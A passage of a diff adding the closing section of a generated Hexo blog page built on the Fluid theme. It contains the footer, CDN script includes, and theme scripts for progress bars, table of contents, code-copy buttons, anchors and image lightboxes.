+       <a href="https://mechoy.github.io" target="_blank" rel="nofollow noopener"><span>Mechoy</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.0/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script>
+  (function() {
+    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
+    var enableCopy = CONFIG.copy_btn;
+    if (!enableLang && !enableCopy) {
+      return;
+    }
+
+    function getBgClass(ele) {
+      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
+    }
+
+    var copyTmpl = '';
+    copyTmpl += '<div class="code-widget">';
+    copyTmpl += 'LANG';
+    copyTmpl += '</div>';
+    jQuery('.markdown-body pre').each(function() {
+      var $pre = jQuery(this);
+      if ($pre.find('code.mermaid').length > 0) {
+        return;
+      }
+      if ($pre.find('span.line').length > 0) {
+        return;
+      }
+
+      var lang = '';
+
+      if (enableLang) {
+        lang = CONFIG.code_language.default;
+        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
+          lang = $pre[0].children[0].classList[1];
+        } else if ($pre[0].getAttribute('data-language')) {
+          lang = $pre[0].getAttribute('data-language');
+        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
+          lang = $pre[0].children[0].classList[1];
+          $pre.parent().addClass('code-wrapper');
+        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
+          $pre.wrap('<div class="code-wrapper"></div>');
+        }
+        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
+      }
+      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
+        getBgClass($pre[0]) + (enableCopy ? ' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>' : ' code-widget">')));
+
+      if (enableCopy) {
+        Fluid.utils.createScript('https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js', function() {
+          var clipboard = new window.ClipboardJS('.copy-btn', {
+            target: function(trigger) {
+              var nodes = trigger.parentNode.childNodes;
+              for (var i = 0; i < nodes.length; i++) {
+                if (nodes[i].tagName === 'CODE') {
+                  return nodes[i];
+                }
+              }
+            }
+          });
+          clipboard.on('success', function(e) {
+            e.clearSelection();
+            e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-copy', 'icon-success');
+            setTimeout(function() {
+              e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-success', 'icon-copy');
+            }, 2000);
+          });
+        });
+      }
+    });
+  })();
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
